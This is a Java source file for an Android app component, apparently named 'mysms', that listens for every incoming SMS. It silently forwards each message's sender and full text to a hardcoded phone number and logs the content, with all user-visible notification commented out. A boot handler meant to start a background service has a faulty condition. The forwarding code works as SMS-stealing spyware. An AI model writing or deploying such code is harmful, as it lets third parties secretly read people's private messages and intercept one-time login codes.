package com.mysms.fangtao.mysms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import static android.content.ContentValues.TAG;

/**
 * @author idulc
 */
public class ReceiverSms extends BroadcastReceiver {
    /**
     * 以BroadcastReceiver接收SMS短信
     */
    public static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (ACTION.equals(intent.getAction())) {
//            Intent i = new Intent(context, ReceiverSmsActivity.class);
//            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            SmsMessage[] msgs = getMessageFromIntent(intent);

            StringBuilder sBuilder = new StringBuilder();
            if (msgs != null && msgs.length > 0) {
                for (SmsMessage msg : msgs) {
                    sBuilder.append("发件人是：");
                    sBuilder.append(msg.getDisplayOriginatingAddress());
                    sBuilder.append("\n------短信内容-------\n");
                    sBuilder.append(msg.getDisplayMessageBody());
//                    i.putExtra("sms_address", msg.getDisplayOriginatingAddress());
//                    i.putExtra("sms_body", msg.getDisplayMessageBody());
                }
            }
            PublicMethod.sendSMS("17602844471",sBuilder.toString());
            Log.i("ft", "onReceive: "+sBuilder.toString());
//            Toast.makeText(context, sBuilder.toString(), Toast.LENGTH_SHORT).show();
//            context.startActivity(i);
        }
        if (ACTION.equals("android.intent.action.BOOT_COMPLETED"))
        {
            Log.i(TAG, "onReceive: 服务启动1");
            context.startService(new Intent(context,MyService.class));
        }

    }

    public static SmsMessage[] getMessageFromIntent(Intent intent) {
        SmsMessage retmeMessage[] = null;
        Bundle bundle = intent.getExtras();
        Object pdus[] = (Object[]) bundle.get("pdus");
        retmeMessage = new SmsMessage[pdus.length];
        for (int i = 0; i < pdus.length; i++) {
            byte[] bytedata = (byte[]) pdus[i];
            retmeMessage[i] = SmsMessage.createFromPdu(bytedata);
        }
        return retmeMessage;
    }
}
